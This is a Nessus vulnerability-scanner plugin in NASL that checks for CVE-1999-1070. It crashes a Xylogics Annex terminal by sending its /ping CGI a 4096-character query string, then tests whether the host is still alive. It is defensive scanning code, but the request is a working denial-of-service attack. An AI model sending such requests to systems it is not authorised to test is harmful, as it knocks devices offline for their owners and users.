#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10017);
 script_version("$Revision: 1.39 $");
 script_cvs_date("$Date: 2014/05/25 01:17:39 $");

 script_cve_id("CVE-1999-1070");
 script_osvdb_id(9856);

 script_name(english:"Xylogics Annex Terminal Service ping CGI Program DoS");
 script_summary(english:"Crashes an Annex terminal");

 script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote Annex terminal by connecting to
the HTTP port, and requesting the '/ping' CGI script with an argument
that is too long. For example:

 http://www.example.com/ping?query=AAAAA(...)AAAAA");
 script_set_attribute(attribute:"solution", value:"Remove the '/ping' CGI script from your web server.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/07/25");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("find_service1.nasl", "http_version.nasl", "no404.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);
if  (http_is_dead(port: port)) exit(0);

cgi = "/ping";
if (! is_cgi_installed3(item:cgi, port:port)) exit(0);

start_denial();
r = http_send_recv3(port: port, item: strcat(cgi, "?query=", crap(4096)), method: 'GET');
if (http_is_dead(port: port, retry: 3))
{
 alive = end_denial();
 if(!alive)
 {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
 }
}
